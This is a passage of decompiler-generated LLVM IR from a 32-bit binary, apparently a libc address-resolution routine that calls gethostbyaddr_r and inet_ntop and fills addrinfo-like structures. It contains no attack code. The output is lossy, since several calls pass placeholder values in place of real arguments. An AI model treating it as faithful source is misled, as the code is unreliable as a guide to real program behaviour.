  %v3_805e69e = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e69e, i32* @edi, align 4
  store i8* null, i8** %stack_var_-152, align 4
  %v1_805e92641 = icmp eq i32 %v3_805e69e, 0
  %v1_805e92848 = icmp eq i1 %v1_805e92641, false
  br i1 %v1_805e92848, label %dec_label_pc_805e6b0.lr.ph, label %dec_label_pc_805e95e

dec_label_pc_805e6b0.lr.ph:                       ; preds = %dec_label_pc_805e69e
  %v1_805e7f5 = inttoptr i32 %arg3 to i32*
  %v4_805e78c = icmp eq i32 %stack_var_-160.0, 0
  %. = select i1 %v4_805e78c, i32 16, i32 28
  %.17 = select i1 %v4_805e78c, i16 2, i16 10
  %v2_805e6fc = ptrtoint i8** %stack_var_-32 to i32
  %v2_805e700 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805e706 = ptrtoint i32* %stack_var_-68 to i32
  %v2_805e73f = ptrtoint i32* %stack_var_-114 to i32
  %tmp162 = bitcast i8** %stack_var_-152 to i32*
  br label %dec_label_pc_805e6b0

dec_label_pc_805e6b0:                             ; preds = %dec_label_pc_805e6b0.lr.ph, %dec_label_pc_805e924
  %v0_805e6d496 = phi i32 [ %v3_805e69e, %dec_label_pc_805e6b0.lr.ph ], [ %v2_805e924, %dec_label_pc_805e924 ]
  %stack_var_16.149 = phi i32 [ %arg4, %dec_label_pc_805e6b0.lr.ph ], [ %stack_var_16.0.lcssa, %dec_label_pc_805e924 ]
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805e6bd = load i8, i8* %tmp116, align 1
  %v3_805e6bd = and i8 %v2_805e6bd, 2
  %v4_805e6bd = icmp eq i8 %v3_805e6bd, 0
  br i1 %v4_805e6bd, label %dec_label_pc_805e786, label %dec_label_pc_805e6c6

dec_label_pc_805e6c6:                             ; preds = %dec_label_pc_805e6b0
  store i32 0, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805e6d2

dec_label_pc_805e6d2:                             ; preds = %dec_label_pc_805e722.dec_label_pc_805e6d2_crit_edge, %dec_label_pc_805e6c6
  %v0_805e6f6 = phi i32 [ %v0_805e6d4.pre, %dec_label_pc_805e722.dec_label_pc_805e6d2_crit_edge ], [ %v0_805e6d496, %dec_label_pc_805e6c6 ]
  %v0_805e6d2 = phi i32 [ %v0_805e6d2.pre, %dec_label_pc_805e722.dec_label_pc_805e6d2_crit_edge ], [ 512, %dec_label_pc_805e6c6 ]
  %v2_805e6d2 = mul i32 %v0_805e6d2, 2
  store i32 %v2_805e6d2, i32* @esi, align 4
  %v1_805e6d4 = add i32 %v0_805e6f6, 4
  %v2_805e6d4 = inttoptr i32 %v1_805e6d4 to i32*
  %v3_805e6d4 = load i32, i32* %v2_805e6d4, align 4
  store i32 %v3_805e6d4, i32* @ebx, align 4
  %v1_805e6dc = add i32 %v2_805e6d2, 30
  %v1_805e6df = and i32 %v1_805e6dc, -16
  %v0_805e6e2 = load i32, i32* @esp, align 4
  %v2_805e6e2 = sub i32 %v0_805e6e2, %v1_805e6df
  %v1_805e6e9 = add i32 %v2_805e6e2, 15
  %v1_805e6ed = and i32 %v1_805e6e9, -16
  store i32 %v1_805e6ed, i32* %edx.global-to-local, align 4
  %v9_805e6f0 = icmp eq i32 %v3_805e6d4, 10
  %v3_805e6f3 = select i1 %v9_805e6f0, i32 16, i32 4
  store i32 %v3_805e6f3, i32* %ecx.global-to-local, align 4
  %v1_805e6f6 = add i32 %v0_805e6f6, 8
  %v2_805e6ff = add i32 %v2_805e6e2, -4
  %v3_805e6ff = inttoptr i32 %v2_805e6ff to i32*
  store i32 %v2_805e6fc, i32* %v3_805e6ff, align 4
  %v2_805e703 = add i32 %v2_805e6e2, -8
  %v3_805e703 = inttoptr i32 %v2_805e703 to i32*
  store i32 %v2_805e700, i32* %v3_805e703, align 4
  %v0_805e704 = load i32, i32* @esi, align 4
  %v2_805e704 = add i32 %v2_805e6e2, -12
  %v3_805e704 = inttoptr i32 %v2_805e704 to i32*
  store i32 %v0_805e704, i32* %v3_805e704, align 4
  %v0_805e705 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e705 = add i32 %v2_805e6e2, -16
  %v3_805e705 = inttoptr i32 %v2_805e705 to i32*
  store i32 %v0_805e705, i32* %v3_805e705, align 4
  store i32 %v2_805e706, i32* %eax.global-to-local, align 4
  %v2_805e709 = add i32 %v2_805e6e2, -20
  %v3_805e709 = inttoptr i32 %v2_805e709 to i32*
  store i32 %v2_805e706, i32* %v3_805e709, align 4
  %v0_805e70a = load i32, i32* @ebx, align 4
  %v2_805e70a = add i32 %v2_805e6e2, -24
  %v3_805e70a = inttoptr i32 %v2_805e70a to i32*
  store i32 %v0_805e70a, i32* %v3_805e70a, align 4
  %v0_805e70b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805e70b = add i32 %v2_805e6e2, -28
  %v3_805e70b = inttoptr i32 %v2_805e70b to i32*
  store i32 %v0_805e70b, i32* %v3_805e70b, align 4
  %v5_805e70c = add i32 %v2_805e6e2, -32
  %v6_805e70c = inttoptr i32 %v5_805e70c to i32*
  store i32 %v1_805e6f6, i32* %v6_805e70c, align 4
  %v1_805e70f = inttoptr i32 %v1_805e6f6 to i8*
  %v2_805e70f = call i32 @__GI_gethostbyaddr_r(i8* %v1_805e70f)
  store i32 %v2_805e70f, i32* %eax.global-to-local, align 4
  store i32 %v2_805e70f, i32* @ebx, align 4
  %v1_805e719 = call i32 @__errno_location(i32 %v1_805e6f6)
  store i32 %v1_805e719, i32* %eax.global-to-local, align 4
  %v2_805e71e = inttoptr i32 %v1_805e719 to i32*
  %v3_805e71e = load i32, i32* %v2_805e71e, align 4
  %v14_805e71e = icmp eq i32 %v2_805e70f, %v3_805e71e
  %v1_805e720 = icmp eq i1 %v14_805e71e, false
  br i1 %v1_805e720, label %dec_label_pc_805e728, label %dec_label_pc_805e722

dec_label_pc_805e722:                             ; preds = %dec_label_pc_805e6d2
  %v3_805e722 = load i8*, i8** %stack_var_-32, align 4
  %v14_805e722 = icmp eq i8* %v3_805e722, inttoptr (i32 -1 to i8*)
  br i1 %v14_805e722, label %dec_label_pc_805e722.dec_label_pc_805e6d2_crit_edge, label %dec_label_pc_805e728

dec_label_pc_805e722.dec_label_pc_805e6d2_crit_edge: ; preds = %dec_label_pc_805e722
  %v0_805e6d2.pre = load i32, i32* @esi, align 4
  %v0_805e6d4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e6d2

dec_label_pc_805e728:                             ; preds = %dec_label_pc_805e722, %dec_label_pc_805e6d2
  %v1_805e728 = icmp eq i32 %v2_805e70f, 0
  br i1 %v1_805e728, label %dec_label_pc_805e736, label %dec_label_pc_805e72c

dec_label_pc_805e72c:                             ; preds = %dec_label_pc_805e728
  %v3_805e72c = load i8*, i8** %stack_var_-32, align 4
  %v14_805e72c = icmp eq i8* %v3_805e72c, inttoptr (i32 -1 to i8*)
  br i1 %v14_805e72c, label %dec_label_pc_805e945, label %dec_label_pc_805e736

dec_label_pc_805e736:                             ; preds = %dec_label_pc_805e72c, %dec_label_pc_805e728
  %v3_805e736 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_805e736, i32* %eax.global-to-local, align 4
  %v1_805e739 = icmp eq i32 %v3_805e736, 0
  %v1_805e73b = icmp eq i1 %v1_805e739, false
  br i1 %v1_805e73b, label %dec_label_pc_805e759, label %dec_label_pc_805e73d

dec_label_pc_805e73d:                             ; preds = %dec_label_pc_805e736
  %v0_805e73d = load i32, i32* @esp, align 4
  %v1_805e73d = add i32 %v0_805e73d, -4
  %v2_805e73d = inttoptr i32 %v1_805e73d to i32*
  store i32 46, i32* %v2_805e73d, align 4
  store i32 %v2_805e73f, i32* %eax.global-to-local, align 4
  %v2_805e742 = add i32 %v0_805e73d, -8
  %v3_805e742 = inttoptr i32 %v2_805e742 to i32*
  store i32 %v2_805e73f, i32* %v3_805e742, align 4
  %v5_805e743 = add i32 %v0_805e73d, -12
  %v6_805e743 = inttoptr i32 %v5_805e743 to i32*
  store i32 %v1_805e6f6, i32* %v6_805e743, align 4
  %v0_805e746 = load i32, i32* @edi, align 4
  %v1_805e746 = add i32 %v0_805e746, 4
  %v2_805e746 = inttoptr i32 %v1_805e746 to i32*
  %v3_805e746 = load i32, i32* %v2_805e746, align 4
  %v5_805e746 = add i32 %v0_805e73d, -16
  %v6_805e746 = inttoptr i32 %v5_805e746 to i32*
  store i32 %v3_805e746, i32* %v6_805e746, align 4
  %v5_805e749 = call i32 @__GI_inet_ntop(i32 %v1_805e6f6, i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805e749, i32* %eax.global-to-local, align 4
  store i32 %v5_805e749, i32* %tmp162, align 4
  %tmp163 = inttoptr i32 %v5_805e749 to i8*
  br label %dec_label_pc_805e761

dec_label_pc_805e759:                             ; preds = %dec_label_pc_805e736
  %v1_805e759 = inttoptr i32 %v3_805e736 to i32*
  %v2_805e759 = load i32, i32* %v1_805e759, align 4
  store i32 %v2_805e759, i32* %eax.global-to-local, align 4
  %v5_805e75b = inttoptr i32 %v2_805e759 to i8*
  store i8* %v5_805e75b, i8** %stack_var_-152, align 4
  br label %dec_label_pc_805e761

dec_label_pc_805e761:                             ; preds = %dec_label_pc_805e73d, %dec_label_pc_805e759
  %v3_805e771 = phi i8* [ %tmp163, %dec_label_pc_805e73d ], [ %v5_805e75b, %dec_label_pc_805e759 ]
  %v5_805e761 = icmp eq i8* %v3_805e771, null
  br i1 %v5_805e761, label %dec_label_pc_805e93e, label %dec_label_pc_805e76e

dec_label_pc_805e76e:                             ; preds = %dec_label_pc_805e761
  %v4_805e761 = ptrtoint i8* %v3_805e771 to i32
  %v0_805e76e = load i32, i32* @esp, align 4
  %v6_805e771 = add i32 %v0_805e76e, -16
  %v7_805e771 = inttoptr i32 %v6_805e771 to i32*
  store i32 %v4_805e761, i32* %v7_805e771, align 4
  %v0_805e777 = load i8*, i8** %stack_var_-152, align 4
  %v3_805e777 = call i32 @strlen(i8* %v0_805e777)
  %v1_805e77f = add i32 %v3_805e777, 1
  store i32 %v1_805e77f, i32* %eax.global-to-local, align 4
  %v0_805e786.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e786

dec_label_pc_805e786:                             ; preds = %dec_label_pc_805e6b0, %dec_label_pc_805e76e
  %v0_805e786 = phi i32 [ %v0_805e6d496, %dec_label_pc_805e6b0 ], [ %v0_805e786.pre, %dec_label_pc_805e76e ]
  %stack_var_-144.0 = phi i32 [ 0, %dec_label_pc_805e6b0 ], [ %v1_805e77f, %dec_label_pc_805e76e ]
  %v1_805e786 = add i32 %v0_805e786, 4
  %v2_805e786 = inttoptr i32 %v1_805e786 to i32*
  %v3_805e786 = load i32, i32* %v2_805e786, align 4
  %v12_805e786 = icmp eq i32 %v3_805e786, 10
  br i1 %v12_805e786, label %dec_label_pc_805e7bf, label %dec_label_pc_805e78c

dec_label_pc_805e78c:                             ; preds = %dec_label_pc_805e786
  br label %dec_label_pc_805e7bf

dec_label_pc_805e7bf:                             ; preds = %dec_label_pc_805e78c, %dec_label_pc_805e786
  %storemerge16 = phi i32 [ 28, %dec_label_pc_805e786 ], [ %., %dec_label_pc_805e78c ]
  %storemerge12 = phi i16 [ 10, %dec_label_pc_805e786 ], [ %.17, %dec_label_pc_805e78c ]
  %storemerge1030 = load i32, i32* %stack_var_-20, align 4
  store i32 %storemerge1030, i32* @esi, align 4
  %v1_805e91c31 = icmp eq i32 %storemerge1030, 0
  %v1_805e91e38 = icmp eq i1 %v1_805e91c31, false
  br i1 %v1_805e91e38, label %dec_label_pc_805e7c7.lr.ph, label %dec_label_pc_805e924

dec_label_pc_805e7c7.lr.ph:                       ; preds = %dec_label_pc_805e7bf
  %v2_805e7d6 = or i32 %storemerge16, 32
  %v1_805e7db18 = zext i16 %storemerge12 to i32
  %v14_805e841 = icmp eq i16 %storemerge12, 10
  %v4_805e8ab = inttoptr i32 %v1_805e7db18 to i16*
  %v4_805e8c2 = inttoptr i32 %v1_805e7db18 to i8*
  %v3_805e7d6 = add i32 %v2_805e7d6, %stack_var_-144.0
  %v1_805e84b = icmp eq i1 %v14_805e841, false
  br label %dec_label_pc_805e7c7

dec_label_pc_805e7c7:                             ; preds = %dec_label_pc_805e7c7.lr.ph, %dec_label_pc_805e906
  %stack_var_16.039 = phi i32 [ %stack_var_16.149, %dec_label_pc_805e7c7.lr.ph ], [ %v1_805e914, %dec_label_pc_805e906 ]
  store i32 %stack_var_-144.0, i32* %edx.global-to-local, align 4
  %v0_805e7cd = load i32, i32* @esp, align 4
  store i32 %storemerge16, i32* @ecx, align 4
  store i32 %v3_805e7d6, i32* %eax.global-to-local, align 4
  %v2_805e7da = add i32 %v0_805e7cd, -16
  %v3_805e7da = inttoptr i32 %v2_805e7da to i32*
  store i32 %v3_805e7d6, i32* %v3_805e7da, align 4
  %v2_805e7db = call i32 @malloc(i32 %v1_805e7db18)
  store i32 %v2_805e7db, i32* %edx.global-to-local, align 4
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v1_805e7e8 = icmp eq i32 %v2_805e7db, 0
  %v2_805e7ea = inttoptr i32 %stack_var_16.039 to i32*
  store i32 %v2_805e7db, i32* %v2_805e7ea, align 4
  br i1 %v1_805e7e8, label %dec_label_pc_805e957, label %dec_label_pc_805e7f2

dec_label_pc_805e7f2:                             ; preds = %dec_label_pc_805e7c7
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_805e7f5 = load i32, i32* %v1_805e7f5, align 4
  store i32 %v2_805e7f5, i32* %eax.global-to-local, align 4
  %v2_805e7f7 = inttoptr i32 %v2_805e7db to i32*
  store i32 %v2_805e7f5, i32* %v2_805e7f7, align 4
  store i32 %stack_var_16.039, i32* %edx.global-to-local, align 4
  store i32 %v1_805e7db18, i32* %ecx.global-to-local, align 4
  %v2_805e802 = load i32, i32* %v2_805e7ea, align 4
  %v2_805e804 = add i32 %v2_805e802, 4
  %v3_805e804 = inttoptr i32 %v2_805e804 to i32*
  store i32 %v1_805e7db18, i32* %v3_805e804, align 4
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v2_805e80a = load i32, i32* %v2_805e7ea, align 4
  store i32 %v2_805e80a, i32* %edx.global-to-local, align 4
  %v0_805e80c = load i32, i32* @esi, align 4
  %v1_805e80c = add i32 %v0_805e80c, 4
  %v2_805e80c = inttoptr i32 %v1_805e80c to i32*
  %v3_805e80c = load i32, i32* %v2_805e80c, align 4
  store i32 %v3_805e80c, i32* %eax.global-to-local, align 4
  %v2_805e80f = add i32 %v2_805e80a, 8
  %v3_805e80f = inttoptr i32 %v2_805e80f to i32*
  store i32 %v3_805e80c, i32* %v3_805e80f, align 4
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v0_805e815 = load i32, i32* @esi, align 4
  %v1_805e815 = add i32 %v0_805e815, 8
  %v2_805e815 = inttoptr i32 %v1_805e815 to i32*
  %v3_805e815 = load i32, i32* %v2_805e815, align 4
  store i32 %v3_805e815, i32* %eax.global-to-local, align 4
  %v2_805e818 = load i32, i32* %v2_805e7ea, align 4
  store i32 %v2_805e818, i32* %edx.global-to-local, align 4
  %v2_805e81a = add i32 %v2_805e818, 12
  %v3_805e81a = inttoptr i32 %v2_805e81a to i32*
  store i32 %v3_805e815, i32* %v3_805e81a, align 4
  %v0_805e81d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e81d = inttoptr i32 %v0_805e81d to i32*
  %v2_805e81d = load i32, i32* %v1_805e81d, align 4
  store i32 %v2_805e81d, i32* %eax.global-to-local, align 4
  store i32 %storemerge16, i32* %edx.global-to-local, align 4
  %v2_805e825 = add i32 %v2_805e81d, 16
  %v3_805e825 = inttoptr i32 %v2_805e825 to i32*
  store i32 %storemerge16, i32* %v3_805e825, align 4
  %v0_805e828 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e828 = inttoptr i32 %v0_805e828 to i32*
  %v2_805e828 = load i32, i32* %v1_805e828, align 4
  store i32 %v2_805e828, i32* %edx.global-to-local, align 4
  %v1_805e82a = add i32 %v2_805e828, 32
  store i32 %v1_805e82a, i32* %eax.global-to-local, align 4
  %v2_805e82d = add i32 %v2_805e828, 20
  %v3_805e82d = inttoptr i32 %v2_805e82d to i32*
  store i32 %v1_805e82a, i32* %v3_805e82d, align 4
  %v0_805e830 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e830 = inttoptr i32 %v0_805e830 to i32*
  %v2_805e830 = load i32, i32* %v1_805e830, align 4
  store i32 %v2_805e830, i32* %eax.global-to-local, align 4
  store i32 %v1_805e7db18, i32* %ecx.global-to-local, align 4
  %v1_805e838 = add i32 %v2_805e830, 20
  %v2_805e838 = inttoptr i32 %v1_805e838 to i32*
  %v3_805e838 = load i32, i32* %v2_805e838, align 4
  %v3_805e83b = inttoptr i32 %v3_805e838 to i16*
  store i16 %storemerge12, i16* %v3_805e83b, align 2
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v2_805e849 = load i32, i32* %v2_805e7ea, align 4
  store i32 %v2_805e849, i32* %edx.global-to-local, align 4
  %v1_805e89d = add i32 %v2_805e849, 20
  %v2_805e89d = inttoptr i32 %v1_805e89d to i32*
  %v3_805e89d = load i32, i32* %v2_805e89d, align 4
  store i32 %v3_805e89d, i32* @ebx, align 4
  %v0_805e8a0 = load i32, i32* @edi, align 4
  %v1_805e8a0 = add i32 %v0_805e8a0, 8
  store i32 %v1_805e8a0, i32* %eax.global-to-local, align 4
  br i1 %v1_805e84b, label %dec_label_pc_805e89d, label %dec_label_pc_805e84d

dec_label_pc_805e84d:                             ; preds = %dec_label_pc_805e7f2
  %v1_805e853 = add i32 %v3_805e89d, 4
  %v2_805e853 = inttoptr i32 %v1_805e853 to i32*
  store i32 0, i32* %v2_805e853, align 4
  %v0_805e85a = load i32, i32* @edi, align 4
  %v1_805e85a = add i32 %v0_805e85a, 4
  %v2_805e85a = inttoptr i32 %v1_805e85a to i32*
  %v3_805e85a = load i32, i32* %v2_805e85a, align 4
  %v12_805e85a = icmp eq i32 %v3_805e85a, 10
  %v1_805e85e = icmp eq i1 %v12_805e85a, false
  br i1 %v1_805e85e, label %dec_label_pc_805e869, label %dec_label_pc_805e860

dec_label_pc_805e860:                             ; preds = %dec_label_pc_805e84d
  %v0_805e860 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e860 = load i32, i32* @esp, align 4
  %v2_805e860 = add i32 %v1_805e860, -4
  %v3_805e860 = inttoptr i32 %v2_805e860 to i32*
  store i32 %v0_805e860, i32* %v3_805e860, align 4
  %v1_805e861 = add i32 %v1_805e860, -8
  %v2_805e861 = inttoptr i32 %v1_805e861 to i32*
  store i32 16, i32* %v2_805e861, align 4
  %v0_805e863 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e863 = add i32 %v1_805e860, -12
  %v3_805e863 = inttoptr i32 %v2_805e863 to i32*
  store i32 %v0_805e863, i32* %v3_805e863, align 4
  %v0_805e864 = load i32, i32* @ebx, align 4
  %v1_805e864 = add i32 %v0_805e864, 8
  br label %dec_label_pc_805e885

dec_label_pc_805e869:                             ; preds = %dec_label_pc_805e84d
  %v0_805e869 = load i32, i32* @ebx, align 4
  %v1_805e869 = add i32 %v0_805e869, 8
  %v2_805e869 = inttoptr i32 %v1_805e869 to i32*
  store i32 0, i32* %v2_805e869, align 4
  %v0_805e870 = load i32, i32* @ebx, align 4
  %v1_805e870 = add i32 %v0_805e870, 12
  %v2_805e870 = inttoptr i32 %v1_805e870 to i32*
  store i32 0, i32* %v2_805e870, align 4
  %v0_805e877 = load i32, i32* @ebx, align 4
  %v1_805e877 = add i32 %v0_805e877, 16
  %v2_805e877 = inttoptr i32 %v1_805e877 to i32*
  store i32 -65536, i32* %v2_805e877, align 4
  %v0_805e87e = load i32, i32* %edx.global-to-local, align 4
  %v1_805e87e = load i32, i32* @esp, align 4
  %v2_805e87e = add i32 %v1_805e87e, -4
  %v3_805e87e = inttoptr i32 %v2_805e87e to i32*
  store i32 %v0_805e87e, i32* %v3_805e87e, align 4
  %v1_805e87f = add i32 %v1_805e87e, -8
  %v2_805e87f = inttoptr i32 %v1_805e87f to i32*
  store i32 4, i32* %v2_805e87f, align 4
  %v0_805e881 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e881 = add i32 %v1_805e87e, -12
  %v3_805e881 = inttoptr i32 %v2_805e881 to i32*
  store i32 %v0_805e881, i32* %v3_805e881, align 4
  %v0_805e882 = load i32, i32* @ebx, align 4
  %v1_805e882 = add i32 %v0_805e882, 20
  br label %dec_label_pc_805e885

dec_label_pc_805e885:                             ; preds = %dec_label_pc_805e860, %dec_label_pc_805e869
  %v1_805e885 = phi i32 [ %v2_805e863, %dec_label_pc_805e860 ], [ %v2_805e881, %dec_label_pc_805e869 ]
  %storemerge11 = phi i32 [ %v1_805e864, %dec_label_pc_805e860 ], [ %v1_805e882, %dec_label_pc_805e869 ]
  store i32 %storemerge11, i32* %eax.global-to-local, align 4
  %v2_805e885 = add i32 %v1_805e885, -4
  %v3_805e885 = inttoptr i32 %v2_805e885 to i32*
  store i32 %storemerge11, i32* %v3_805e885, align 4
  %v5_805e886 = call i32 @memcpy(i16* %v4_805e8ab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805e886, i32* %eax.global-to-local, align 4
  %v0_805e88b = load i32, i32* @esi, align 4
  %v1_805e88b = add i32 %v0_805e88b, 12
  %v2_805e88b = inttoptr i32 %v1_805e88b to i32*
  %v3_805e88b = load i32, i32* %v2_805e88b, align 4
  store i32 %v3_805e88b, i32* %eax.global-to-local, align 4
  %v1_805e891 = trunc i32 %v3_805e88b to i16
  %v2_805e891 = load i32, i32* @ebx, align 4
  %v3_805e891 = add i32 %v2_805e891, 2
  %v4_805e891 = inttoptr i32 %v3_805e891 to i16*
  store i16 %v1_805e891, i16* %v4_805e891, align 2
  %v0_805e895 = load i32, i32* @edi, align 4
  %v1_805e895 = add i32 %v0_805e895, 24
  %v2_805e895 = inttoptr i32 %v1_805e895 to i32*
  %v3_805e895 = load i32, i32* %v2_805e895, align 4
  store i32 %v3_805e895, i32* %eax.global-to-local, align 4
  %v1_805e898 = load i32, i32* @ebx, align 4
  %v2_805e898 = add i32 %v1_805e898, 24
  %v3_805e898 = inttoptr i32 %v2_805e898 to i32*
  store i32 %v3_805e895, i32* %v3_805e898, align 4
  br label %dec_label_pc_805e8ca

dec_label_pc_805e89d:                             ; preds = %dec_label_pc_805e7f2
  %v0_805e8a3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e8a3 = load i32, i32* @esp, align 4
  %v2_805e8a3 = add i32 %v1_805e8a3, -4
  %v3_805e8a3 = inttoptr i32 %v2_805e8a3 to i32*
  store i32 %v0_805e8a3, i32* %v3_805e8a3, align 4
  %v1_805e8a4 = add i32 %v1_805e8a3, -8
  %v2_805e8a4 = inttoptr i32 %v1_805e8a4 to i32*
  store i32 4, i32* %v2_805e8a4, align 4
  %v0_805e8a6 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e8a6 = add i32 %v1_805e8a3, -12
  %v3_805e8a6 = inttoptr i32 %v2_805e8a6 to i32*
  store i32 %v0_805e8a6, i32* %v3_805e8a6, align 4
  %v0_805e8a7 = load i32, i32* @ebx, align 4
  %v1_805e8a7 = add i32 %v0_805e8a7, 4
  store i32 %v1_805e8a7, i32* %eax.global-to-local, align 4
  %v2_805e8aa = add i32 %v1_805e8a3, -16
  %v3_805e8aa = inttoptr i32 %v2_805e8aa to i32*
  store i32 %v1_805e8a7, i32* %v3_805e8aa, align 4
  %v5_805e8ab = call i32 @memcpy(i16* %v4_805e8ab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805e8ab, i32* %eax.global-to-local, align 4
  %v0_805e8b0 = load i32, i32* @esi, align 4
  %v1_805e8b0 = add i32 %v0_805e8b0, 12
  %v2_805e8b0 = inttoptr i32 %v1_805e8b0 to i32*
  %v3_805e8b0 = load i32, i32* %v2_805e8b0, align 4
  store i32 %v3_805e8b0, i32* %eax.global-to-local, align 4
  %v1_805e8b6 = trunc i32 %v3_805e8b0 to i16
  %v2_805e8b6 = load i32, i32* @ebx, align 4
  %v3_805e8b6 = add i32 %v2_805e8b6, 2
  %v4_805e8b6 = inttoptr i32 %v3_805e8b6 to i16*
  store i16 %v1_805e8b6, i16* %v4_805e8b6, align 2
  %v0_805e8ba = load i32, i32* @ebx, align 4
  %v1_805e8ba = add i32 %v0_805e8ba, 8
  store i32 %v1_805e8ba, i32* @ebx, align 4
  %v0_805e8bd = load i32, i32* @esp, align 4
  %v1_805e8bd = add i32 %v0_805e8bd, -4
  %v2_805e8bd = inttoptr i32 %v1_805e8bd to i32*
  store i32 8, i32* %v2_805e8bd, align 4
  %v1_805e8bf = add i32 %v0_805e8bd, -8
  %v2_805e8bf = inttoptr i32 %v1_805e8bf to i32*
  store i32 0, i32* %v2_805e8bf, align 4
  %v0_805e8c1 = load i32, i32* @ebx, align 4
  %v2_805e8c1 = add i32 %v0_805e8bd, -12
  %v3_805e8c1 = inttoptr i32 %v2_805e8c1 to i32*
  store i32 %v0_805e8c1, i32* %v3_805e8c1, align 4
  %v5_805e8c2 = call i32 @__GI_memset(i8* %v4_805e8c2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805e8c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e8ca

dec_label_pc_805e8ca:                             ; preds = %dec_label_pc_805e885, %dec_label_pc_805e89d
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v3_805e8cd = load i8*, i8** %stack_var_-152, align 4
  %v5_805e8cd = icmp eq i8* %v3_805e8cd, null
  %v2_805e8d4 = load i32, i32* %v2_805e7ea, align 4
  store i32 %v2_805e8d4, i32* %edx.global-to-local, align 4
  br i1 %v5_805e8cd, label %dec_label_pc_805e8ff, label %dec_label_pc_805e8d8

dec_label_pc_805e8d8:                             ; preds = %dec_label_pc_805e8ca
  store i32 %storemerge16, i32* %ecx.global-to-local, align 4
  %v3_805e8de = add i32 %v2_805e8d4, %v2_805e7d6
  store i32 %v3_805e8de, i32* %eax.global-to-local, align 4
  %v2_805e8e2 = add i32 %v2_805e8d4, 24
  %v3_805e8e2 = inttoptr i32 %v2_805e8e2 to i32*
  store i32 %v3_805e8de, i32* %v3_805e8e2, align 4
  %v0_805e8e5 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e8e5 = load i32, i32* @esp, align 4
  %v2_805e8e5 = add i32 %v1_805e8e5, -4
  %v3_805e8e5 = inttoptr i32 %v2_805e8e5 to i32*
  store i32 %v0_805e8e5, i32* %v3_805e8e5, align 4
  %v0_805e8e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e8e6 = add i32 %v1_805e8e5, -8
  %v3_805e8e6 = inttoptr i32 %v2_805e8e6 to i32*
  store i32 %v0_805e8e6, i32* %v3_805e8e6, align 4
  store i32 %stack_var_16.039, i32* %edx.global-to-local, align 4
  %v3_805e8ea = load i8*, i8** %stack_var_-152, align 4
  %v4_805e8ea = ptrtoint i8* %v3_805e8ea to i32
  %v6_805e8ea = add i32 %v1_805e8e5, -12
  %v7_805e8ea = inttoptr i32 %v6_805e8ea to i32*
  store i32 %v4_805e8ea, i32* %v7_805e8ea, align 4
  %v0_805e8f0 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e8f0 = inttoptr i32 %v0_805e8f0 to i32*
  %v2_805e8f0 = load i32, i32* %v1_805e8f0, align 4
  store i32 %v2_805e8f0, i32* @eax, align 4
  %v1_805e8f2 = add i32 %v2_805e8f0, 24
  %v2_805e8f2 = inttoptr i32 %v1_805e8f2 to i32*
  %v3_805e8f2 = load i32, i32* %v2_805e8f2, align 4
  %v5_805e8f2 = add i32 %v1_805e8e5, -16
  %v6_805e8f2 = inttoptr i32 %v5_805e8f2 to i32*
  store i32 %v3_805e8f2, i32* %v6_805e8f2, align 4
  %v4_805e8f5 = call i32 @strcpy(i8* %v4_805e8c2, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805e8f5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e906

dec_label_pc_805e8ff:                             ; preds = %dec_label_pc_805e8ca
  %v1_805e8ff = add i32 %v2_805e8d4, 24
  %v2_805e8ff = inttoptr i32 %v1_805e8ff to i32*
  store i32 0, i32* %v2_805e8ff, align 4
  br label %dec_label_pc_805e906

dec_label_pc_805e906:                             ; preds = %dec_label_pc_805e8d8, %dec_label_pc_805e8ff
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v2_805e909 = load i32, i32* %v2_805e7ea, align 4
  store i32 %v2_805e909, i32* %eax.global-to-local, align 4
  %v1_805e90b = add i32 %v2_805e909, 28
  %v2_805e90b = inttoptr i32 %v1_805e90b to i32*
  store i32 0, i32* %v2_805e90b, align 4
  %v0_805e912 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805e912 = inttoptr i32 %v0_805e912 to i32*
  %v2_805e912 = load i32, i32* %v1_805e912, align 4
  %v1_805e914 = add i32 %v2_805e912, 28
  store i32 %v1_805e914, i32* %eax.global-to-local, align 4
  %v0_805e91a = load i32, i32* @esi, align 4
  %v1_805e91a = inttoptr i32 %v0_805e91a to i32*
  %storemerge10 = load i32, i32* %v1_805e91a, align 4
  store i32 %storemerge10, i32* @esi, align 4
  %v1_805e91c = icmp eq i32 %storemerge10, 0
  %v1_805e91e = icmp eq i1 %v1_805e91c, false
